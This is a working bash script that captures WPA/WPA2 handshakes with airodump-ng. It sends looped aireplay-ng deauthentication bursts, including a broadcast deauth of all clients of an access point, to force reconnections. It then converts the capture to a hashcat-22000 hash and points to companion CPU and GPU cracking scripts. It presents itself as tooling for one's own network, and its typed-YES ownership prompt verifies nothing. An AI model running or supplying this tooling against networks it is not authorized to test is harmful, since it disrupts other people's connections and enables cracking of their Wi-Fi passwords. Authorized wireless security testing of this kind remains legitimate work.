#!/usr/bin/env bash
#
# capture_handshake.sh — capture the WPA/WPA2 4-way handshake for YOUR OWN
# access point, so you can later verify/recover its passphrase offline.
#
# HOW WPA2-PSK AUTH WORKS (why this captures anything useful):
#   When a client joins a WPA2 network it performs a 4-way handshake with the
#   AP. Those 4 EAPOL frames contain enough material (the ANonce/SNonce and a
#   MIC computed from the Pairwise Master Key) to *verify a guessed passphrase
#   offline* — but NOT the passphrase itself. So capturing a handshake lets you
#   test candidate passwords later; it does not reveal the password directly.
#
#   To capture a handshake you need a client to (re)join while you're listening.
#   You can wait for a device to reconnect naturally, or send a targeted
#   deauth to one of YOUR OWN devices to make it reconnect immediately.
#
#   sudo bash wifi/capture_handshake.sh \
#        --iface wlan1mon --bssid AA:BB:CC:DD:EE:FF --channel 6 \
#        [--client 11:22:33:44:55:66] [--deauth 3] [--out captures/mynet]
#
# Required: --iface (monitor), --bssid (YOUR AP), --channel (YOUR AP's).
set -euo pipefail

if [[ $EUID -ne 0 ]]; then echo "Run as root." >&2; exit 1; fi

IFACE="" BSSID="" CHANNEL="" CLIENT="" DEAUTH=0 OUT="captures/handshake" SECONDS_RUN=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    --iface)   IFACE="$2"; shift 2;;
    --bssid)   BSSID="$2"; shift 2;;
    --channel) CHANNEL="$2"; shift 2;;
    --client)  CLIENT="$2"; shift 2;;
    --deauth)  DEAUTH="$2"; shift 2;;
    --out)     OUT="$2"; shift 2;;
    --seconds) SECONDS_RUN="$2"; shift 2;;   # unattended: capture N s then stop
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    *) echo "Unknown option: $1" >&2; exit 1;;
  esac
done

if [[ -z "$IFACE" || -z "$BSSID" || -z "$CHANNEL" ]]; then
  echo "Missing required args. See: sudo bash $0 --help" >&2
  exit 1
fi

# --- Ownership gate -----------------------------------------------------------
cat <<EOF

  You are about to capture the WPA handshake for:
      AP BSSID : $BSSID
      Channel  : $CHANNEL
$( [[ -n "$CLIENT" ]] && echo "      Client   : $CLIENT" )
$( [[ "$DEAUTH" != 0 ]] && echo "      Deauth   : $DEAUTH burst(s) to force a reconnect" )

  Do this ONLY on a network you own or are explicitly authorized to test.
  Deauthenticating devices you do not own is illegal.

EOF
read -r -p "  Type YES if this access point is yours: " CONFIRM
[[ "$CONFIRM" == "YES" ]] || { echo "Aborted."; exit 1; }

mkdir -p "$(dirname "$OUT")"

# --- Start the capture (background) ------------------------------------------
echo "[*] Locking $IFACE to channel $CHANNEL and capturing to ${OUT}-01.cap"
airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$OUT" \
            --output-format pcap "$IFACE" &
AIRO_PID=$!
# give airodump a moment to hop to the channel and start writing
sleep 5

# --- Deauth to force a full handshake (repeated, in the background) -----------
# A single burst often gets lost, so we re-send every few seconds for the whole
# capture window. Targets your named --client if given, else broadcasts to all
# clients of YOUR AP. (Only effective if the AP isn't enforcing PMF.)
DEAUTH_PID=""
if [[ "$DEAUTH" != 0 ]]; then
  if [[ -n "$CLIENT" ]]; then
    echo "[*] Deauthing client $CLIENT on $BSSID every 10s (your device)…"
    DEAUTH_CMD=(aireplay-ng --deauth "$DEAUTH" -a "$BSSID" -c "$CLIENT" "$IFACE")
  else
    echo "[*] Broadcast-deauthing all clients of $BSSID every 10s (your AP)…"
    DEAUTH_CMD=(aireplay-ng --deauth "$DEAUTH" -a "$BSSID" "$IFACE")
  fi
  # Knock the client, then stay QUIET ~30s so it can complete the 4-way before
  # we bump it again. Continuous deauth prevents the handshake from finishing.
  ( while true; do "${DEAUTH_CMD[@]}" >/dev/null 2>&1 || true; sleep 30; done ) &
  DEAUTH_PID=$!
fi

cat <<EOF

[*] Capturing. Watch the airodump header — when a client (re)connects you'll
    see:  "WPA handshake: $BSSID"  in the top-right.
[*] Once you see that, press Ctrl-C here to stop.
EOF

# Stop airodump (and the deauth loop) on Ctrl-C, or after --seconds if given.
cleanup() { kill $AIRO_PID $DEAUTH_PID 2>/dev/null || true; }
trap cleanup INT TERM
if [[ "$SECONDS_RUN" != 0 ]]; then
  echo "[*] Unattended capture for ${SECONDS_RUN}s, then stopping automatically…"
  sleep "$SECONDS_RUN"
  cleanup
fi
wait $AIRO_PID 2>/dev/null || true
cleanup   # make sure the deauth loop is gone (e.g. after an interactive Ctrl-C)

echo
echo "[*] Verifying the capture actually contains a handshake…"
# airodump increments the suffix each run (-01, -02, …), so check the NEWEST
# file for this prefix, not a hardcoded -01.
LATEST_CAP=$(ls -1t "${OUT}"-*.cap 2>/dev/null | head -1)
[[ -z "$LATEST_CAP" ]] && LATEST_CAP="${OUT}-01.cap"

# Robust detection: hcxpcapngtool tells us definitively whether the capture
# yields a crackable PMKID (WPA*01) or EAPOL handshake pair (WPA*02). aircrack's
# text output varies by version, so use it only as a fallback cross-check.
HS=0
HC="${LATEST_CAP%.cap}.hc22000"     # sibling hashcat-22000 file
if command -v hcxpcapngtool >/dev/null 2>&1; then
  # Convert straight to the named .hc22000 — this doubles as the detection:
  # a non-empty file with a WPA*01/02 line means we have a crackable hash.
  rm -f "$HC"
  if hcxpcapngtool -o "$HC" "$LATEST_CAP" >/dev/null 2>&1 && [ -s "$HC" ] && grep -qE '^WPA\*0[12]' "$HC"; then
    HS=1
  else
    rm -f "$HC"                     # nothing usable — don't leave a stray file
  fi
fi
if [[ $HS -eq 0 ]] && aircrack-ng "$LATEST_CAP" 2>/dev/null | grep -qE '\([1-9][0-9]* handshake'; then
  HS=1
fi

if [[ $HS -eq 1 ]]; then
  echo "[OK] Handshake/PMKID present in $LATEST_CAP"
  if [[ -s "$HC" ]]; then
    echo "[OK] Converted to hashcat-22000:  $HC"
    echo "     Crack on a GPU box:  python3 wifi/crack_hashcat.py --hash $HC"
  else
    echo "     (install hcxtools to auto-convert to .hc22000 for GPU cracking)"
  fi
  echo "     Crack here (CPU):    sudo bash wifi/crack_handshake.sh --cap $LATEST_CAP --bssid $BSSID"
else
  echo "[!] No handshake captured yet in $LATEST_CAP."
  echo "    Re-run and wait for (or trigger) a client reconnect."
fi
